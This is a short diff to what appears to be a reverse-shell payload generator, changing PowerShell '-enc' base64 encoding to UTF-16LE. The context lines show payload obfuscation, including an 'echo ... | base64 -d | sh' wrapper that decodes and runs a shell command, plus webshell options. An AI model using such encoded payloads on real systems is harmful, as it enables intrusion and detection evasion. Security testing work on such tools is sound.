@@ -103,7 +103,7 @@ def main(connection, revy, webshell = '', escape = [], space2cross = '', uencode
 	if bs64 != '':
 		if re.search(r'powershell', revy):
 			splits = revy.split('"')
-			revy = splits[0].replace('-c','-enc')+base64.b64encode(bytes(splits[1], 'utf=8')).decode('utf-8')
+			revy = splits[0].replace('-c','-enc')+base64.b64encode(bytes(splits[1], 'utf=16LE')).decode('utf-8')
 		else:
 			revy = f'echo "{base64.b64encode(bytes(revy, "utf=8")).decode("utf-8")}"|base64 -d|sh'
 	if webshell != '':
